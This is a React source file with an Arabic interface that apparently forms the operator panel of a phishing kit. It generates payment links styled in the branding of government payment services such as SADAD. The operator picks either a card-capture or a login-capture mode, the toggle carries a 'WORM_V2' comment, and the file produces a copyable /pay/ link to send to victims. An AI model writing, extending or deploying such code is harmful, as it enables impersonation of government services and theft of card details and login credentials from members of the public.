import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { useCreateLink } from "@/hooks/useSupabase";
import { useToast } from "@/hooks/use-toast";
import { Copy, Eye, Check, Loader2, ShieldCheck, CreditCard, UserCircle } from "lucide-react";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import { serviceLogos } from "@/lib/serviceLogos";

const GovernmentPaymentLinkCreator = () => {
  const { countryCode } = useParams();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const [amount, setAmount] = useState("");
  const [paymentType, setPaymentType] = useState("card"); // "card" or "login"
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [generatedUrl, setGeneratedUrl] = useState("");
  const [copied, setCopied] = useState(false);

  const queryParams = new URLSearchParams(window.location.search);
  const serviceKey = (queryParams.get("service") || "sadad").toLowerCase();
  const branding = serviceLogos[serviceKey] || serviceLogos["sadad"];

  const handleCreate = async () => {
    if (!amount || isNaN(Number(amount))) {
      toast({ title: "خطأ", description: "الرجاء إدخال مبلغ صحيح", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      const payload = {
        service_key: serviceKey,
        payment_amount: Number(amount),
        payment_type: paymentType, // WORM_V2: Toggle between card and login
        selectedCountry: countryCode
      };

      const result = await createLink.mutateAsync({
        countryCode: countryCode || "SA",
        payload: payload
      });

      const url = `${window.location.origin}/pay/${result.id}`;
      setGeneratedUrl(url);
      toast({ title: "تم النجاح", description: "تم إنشاء رابط الدفع بنجاح" });
    } catch (err) {
      console.error(err);
      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({ title: "تم النسخ", description: "تم نسخ الرابط إلى الحافظة" });
  };

  return (
    <div className="min-h-screen bg-gray-50/50 pb-32" dir="rtl">
      <div className="bg-white border-b border-gray-100 px-4 py-6 sticky top-0 z-50">
        <div className="container mx-auto max-w-xl flex items-center justify-between">
          <BackButton />
          <div className="flex flex-col items-center">
             <h1 className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Government Gateway</h1>
             <div className="font-black text-gray-900">{branding.nameAr}</div>
          </div>
          <div className="w-10" />
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-xl">
        <div className="bg-white rounded-[2rem] border border-gray-100 shadow-2xl p-8 overflow-hidden relative">
          <div className="absolute top-0 left-0 right-0 h-2" style={{ background: branding.colors.primary }} />
          
          <div className="space-y-8">
            <div className="space-y-3">
              <Label className="font-black text-gray-700 text-lg">نوع السداد المطلوب</Label>
              <RadioGroup value={paymentType} onValueChange={setPaymentType} className="grid grid-cols-2 gap-4">
                <div>
                  <RadioGroupItem value="card" id="card" className="peer sr-only" />
                  <Label
                    htmlFor="card"
                    className="flex flex-col items-center justify-between rounded-2xl border-2 border-muted bg-popover p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary cursor-pointer transition-all"
                  >
                    <CreditCard className="mb-3 h-6 w-6" />
                    <span className="font-black text-sm">عن طريق البطاقة</span>
                  </Label>
                </div>
                <div>
                  <RadioGroupItem value="login" id="login" className="peer sr-only" />
                  <Label
                    htmlFor="login"
                    className="flex flex-col items-center justify-between rounded-2xl border-2 border-muted bg-popover p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary cursor-pointer transition-all"
                  >
                    <UserCircle className="mb-3 h-6 w-6" />
                    <span className="font-black text-sm">تسجيل الدخول</span>
                  </Label>
                </div>
              </RadioGroup>
            </div>

            <div className="space-y-3">
              <Label className="font-black text-gray-700 text-lg">المبلغ</Label>
              <Input 
                type="number" 
                placeholder="0.00" 
                className="h-16 text-2xl font-black text-center border-2 border-gray-100 rounded-2xl focus:ring-primary focus:border-primary"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
            </div>

            {!generatedUrl ? (
              <Button 
                onClick={handleCreate} 
                disabled={isSubmitting}
                className="w-full h-16 rounded-2xl font-black text-lg transition-all hover:scale-[1.01] active:scale-[0.99]"
                style={{ background: branding.colors.primary }}
              >
                {isSubmitting ? <Loader2 className="animate-spin" /> : "إنشاء رابط السداد الحكومي"}
              </Button>
            ) : (
              <div className="animate-in fade-in zoom-in duration-500 space-y-4">
                <div className="p-5 bg-gray-50 border border-gray-100 rounded-2xl break-all font-mono text-xs text-center text-gray-500 leading-relaxed">
                  {generatedUrl}
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <Button onClick={copyToClipboard} variant="outline" className="h-14 rounded-xl font-black gap-2 border-2">
                    {copied ? <Check className="w-4 h-4 text-green-600" /> : <Copy className="w-4 h-4" />}
                    نسخ الرابط
                  </Button>
                  <Button onClick={() => window.open(generatedUrl, '_blank')} className="h-14 rounded-xl font-black gap-2" style={{ background: branding.colors.primary }}>
                    <Eye className="w-4 h-4" />
                    معاينة
                  </Button>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default GovernmentPaymentLinkCreator;
